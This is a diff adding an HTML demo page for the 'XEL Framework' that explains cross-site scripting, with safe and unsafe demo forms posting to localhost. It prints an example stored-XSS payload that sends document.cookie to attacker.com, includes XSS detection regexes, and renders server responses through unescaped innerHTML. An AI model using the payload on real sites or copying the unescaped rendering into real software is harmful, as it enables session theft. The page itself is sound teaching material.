@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XEL Framework XSS Prevention Demo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-image: url('https://example.com/space-background.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            font-family: 'Orbitron', sans-serif;
+        }
+        .animate-fade-in {
+            animation: fadeIn 1s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .card-appear {
+            animation: cardAppear 0.5s ease-out;
+        }
+        @keyframes cardAppear {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .input-focus {
+            transition: all 0.3s ease;
+        }
+        .input-focus:focus {
+            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.5);
+        }
+        .button-hover {
+            transition: all 0.3s ease;
+        }
+        .button-hover:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08);
+        }
+        .shake {
+            animation: shake 0.82s cubic-bezier(.36,.07,.19,.97) both;
+        }
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-white">
+    <nav class="bg-gray-800 fixed w-full z-10">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <a href="/" class="text-white text-2xl font-bold flex items-center">
+                    <img src="/src/sources/images/chibi/sw_01.png" alt="Chibi hacker" class="w-8 h-8 mr-2">
+                    XEL
+                </a>
+                <a href="/" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Back to Home</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mx-auto px-4 py-8 pt-20">
+        <h1 class="text-4xl font-bold mb-8 text-center text-blue-400 animate-fade-in">XEL Framework XSS Prevention</h1>
+
+        <section class="mb-12 animate-fade-in" style="animation-delay: 0.2s;">
+            <h2 class="text-2xl font-bold mb-4 text-yellow-400 flex items-center">
+                <img src="/src/sources/images/chibi/sw_01.png" alt="Chibi hacker" class="w-6 h-6 mr-2">
+                Introduction to XSS
+            </h2>
+            <p class="text-gray-300 mb-4">
+                Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to stolen data, session hijacking, and other severe security issues.
+            </p>
+            <p class="text-gray-300 mb-4">
+                XSS attacks occur when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute scripts in a victim's browser, potentially stealing cookies, session tokens, or other sensitive information.
+            </p>
+        </section>
+        
+
+        <section class="mb-12 animate-fade-in" style="animation-delay: 0.4s;">
+            <h2 class="text-2xl font-bold mb-4 text-yellow-400 flex items-center">
+                <img src="/src/sources/images/chibi/sw_01.png" alt="Chibi hacker" class="w-6 h-6 mr-2">
+                Types of XSS Attacks
+            </h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <div>
+                    <h3 class="text-xl font-bold mb-2 text-blue-400">Reflected XSS</h3>
+                    <p class="text-gray-300 mb-4">
+                        In a reflected XSS attack, the malicious script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
+                    </p>
+                </div>
+                <div>
+                    <h3 class="text-xl font-bold mb-2 text-blue-400">Stored XSS</h3>
+                    <p class="text-gray-300 mb-4">
+                        Stored XSS occurs when an attacker injects a malicious script that is permanently stored on the target server, such as in a database. The script is then served to other users when they access the affected page, potentially compromising their data or hijacking their sessions.
+                    </p>
+                </div>
+            </div>
+            <div class="bg-gray-800 p-4 rounded-lg mt-4">
+                <h3 class="text-xl font-bold mb-2 text-blue-400">Example of Stored XSS Payload:</h3>
+                <code class="text-green-400">
+                    &lt;script&gt;
+                        var stolenData = document.cookie;
+                        new Image().src = "http://attacker.com/steal?data=" + encodeURIComponent(stolenData);
+                    &lt;/script&gt;
+                </code>
+                <p class="text-gray-300 mt-2">
+                    This malicious script, if stored and then served to users, would attempt to steal their cookies and send them to the attacker's server.
+                </p>
+            </div>
+        </section>
+
+        <section class="mb-12 animate-fade-in" style="animation-delay: 0.6s;">
+            <h2 class="text-2xl font-bold mb-4 text-yellow-400 flex items-center">
+                <img src="/src/sources/images/chibi/sw_01.png" alt="Chibi hacker" class="w-6 h-6 mr-2">
+                XSS Demo Forms
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <!-- Safe Form -->
+                <div class="bg-gray-800 p-6 rounded-lg">
+                    <h3 class="text-xl font-bold mb-4 text-green-400">Safe Form (Gemstone Auto Sanitization)</h3>
+                    <form id="safe-form" class="space-y-4">
+                        <input type="text" id="safe-name" placeholder="Name" name="name" class="w-full p-2 bg-gray-700 rounded input-focus">
+                        <textarea id="safe-description" placeholder="Description" name="description" class="w-full p-2 bg-gray-700 rounded input-focus"></textarea>
+                        <input type="file" id="safe-image" name="image" accept="image/*" class="w-full p-2 bg-gray-700 rounded input-focus">
+                        <button type="submit" class="bg-green-500 text-white px-4 py-2 rounded button-hover">Submit (Safe)</button>
+                    </form>
+                    <div id="safe-output" class="mt-4 p-4 bg-gray-700 rounded"></div>
+                </div>
+        
+                <!-- Unsafe Form -->
+                <div class="bg-gray-800 p-6 rounded-lg">
+                    <h3 class="text-xl font-bold mb-4 text-red-400">Unsafe Form (No Gmestone Sanitization)</h3>
+                    <form id="unsafe-form" class="space-y-4">
+                        <input type="text" id="unsafe-name" placeholder="Name" name="name" class="w-full p-2 bg-gray-700 rounded input-focus">
+                        <textarea id="unsafe-description" placeholder="Description" name="description" class="w-full p-2 bg-gray-700 rounded input-focus"></textarea>
+                        <input type="file" id="unsafe-image" name="image" accept="image/*" class="w-full p-2 bg-gray-700 rounded input-focus">
+                        <button type="submit" class="bg-red-500 text-white px-4 py-2 rounded button-hover">Submit (Unsafe)</button>
+                    </form>
+                    <div id="unsafe-output" class="mt-4 p-4 bg-gray-700 rounded"></div>
+                </div>
+            </div>
+        </section>
+
+        <section class="mb-12 animate-fade-in" style="animation-delay: 0.8s;">
+            <h2 class="text-2xl font-bold mb-4 text-yellow-400 flex items-center">
+                <img src="/src/sources/images/chibi/sw_01.png" alt="Chibi hacker" class="w-6 h-6 mr-2">
+                Tips Preventing XSS Attacks for Advanced 
+            </h2>
+            <ul class="list-disc list-inside text-gray-300">
+                <li>Never Trust the data came from client</li>
+                <li>Pre-build gemstone Sanitization only Support for first layer sanitization which came throught xel framework server</li>
+                <li>For micro-server with various tech including xel, need adjustment for proper sanitization to secure the data </li>
+                <li>Use modern frameworks that automatically escape output</li>
+                <li>Regularly update and patch your web applications and servers</li>
+            </ul>
+        </section>
+    </div>
+
+    <footer class="bg-gray-800 text-center py-4 mt-12">
+        <p class="text-gray-300">© 2024 XEL Library. All rights reserved.</p>
+    </footer>
+
+    <audio id="success-sound" src="/src/sources/others/novurnurable.ogg"></audio>
+    <audio id="error-sound" src="/src/sources/others/vurnurable.ogg"></audio>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        async function getCsrfToken() {
+            const response = await fetch('http://localhost:9501/xel-csrf', {
+                headers: {
+                    'Origin': 'http://localhost:9502'
+                }
+            });
+            if (!response.ok) {
+                throw new Error('Failed to fetch CSRF token');
+            }
+            const data = await response.json();
+            const token = data['X-CSRF-Token'];
+            return token;
+        }
+
+        async function sendFormData(url, formData, csrfToken) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'X-CSRF-Token': csrfToken,
+                    'Origin': 'http://localhost:9502'
+                },
+                body: formData
+            });
+
+            if (!response.ok) {
+                throw new Error('Form submission failed');
+            }
+            return await response.json();
+        }
+
+        function createCard(data) {
+            return `
+                <div class="bg-gray-800 p-4 rounded-lg mt-4 card-appear">
+                    <h3 class="text-xl font-bold text-blue-400">${data.name}</h3>
+                    <p class="text-gray-300">${data.description}</p>
+                    <img src="${data.image}" alt="${data.name}" class="w-full h-auto mt-2">
+                </div>
+            `;
+        }
+
+        function containsXssScript(text) {
+            // Check for common XSS patterns
+            const xssPatterns = [
+                /on\w+\s*=/, // onError=, onLoad=, etc.
+                /<script/i,
+                /javascript:/i,
+                /data:/i,
+                /vbscript:/i
+            ];
+            return xssPatterns.some(pattern => pattern.test(text));
+        }
+
+        async function handleFormSubmit(formId, outputId, url) {
+            const form = document.getElementById(formId);
+            const output = document.getElementById(outputId);
+            const successSound = document.getElementById('success-sound');
+            const errorSound = document.getElementById('error-sound');
+
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const formData = new FormData(form);
+
+                try {
+                    const csrfToken = await getCsrfToken();
+                    const response = await sendFormData(url, formData, csrfToken);
+                    
+                    // Check if the response contains XSS script
+                    const hasXss = containsXssScript(response.name) || containsXssScript(response.description);
+                    
+                    output.innerHTML = createCard(response);
+                    
+                    if (hasXss) {
+                        errorSound.play();
+                    } else {
+                        successSound.play();
+                    }
+                    
+                    output.classList.add('shake');
+                    setTimeout(() => output.classList.remove('shake'), 820);
+                } catch (error) {
+                    output.innerHTML = createCard({ name: "Error", description: error.message, image: "" });
+                    errorSound.play();
+                    output.classList.add('shake');
+                    setTimeout(() => output.classList.remove('shake'), 820);
+                }
+            });
+        }
+        handleFormSubmit('safe-form', 'safe-output', 'http://localhost:9501/crud/create');
+        handleFormSubmit('unsafe-form', 'unsafe-output', 'http://localhost:9501/crud/xss');
+    });
+    </script>
+</body>
+</html>
